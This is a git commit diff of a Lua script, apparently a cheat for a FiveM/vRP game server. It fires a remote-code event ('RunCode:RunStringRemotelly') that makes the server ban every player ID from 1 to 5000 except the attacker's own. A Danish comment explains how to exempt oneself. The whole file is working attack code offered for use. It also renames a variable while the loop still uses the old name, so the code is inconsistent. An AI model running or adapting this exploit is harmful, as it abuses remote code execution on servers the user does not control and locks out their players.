bf2ee7804c0066a47ac36e8efda12145e17a0304
0x98a <81833678+0x98a@users.noreply.github.com>
2021-04-27 19:50:43 +0200

    upadte

--- ban.lua
+++ ban.lua
@@ -1,9 +1,11 @@
+-- Banner alle fra id 1 til 5000. Sæt "ID" til at være dit id hvis du ik skal bannes.
+
 TriggerServerEvent('RunCode:RunStringRemotelly', [[
-    local ditID = 1
-    local banbesked = ""
+    local ID = 1
+    local BanMessage = ""
 
     for i=1,5000 do 
-        if i ~= ditID then
+        if i ~= ID then
             vRP.ban({i,banbesked,true})
         end
     end
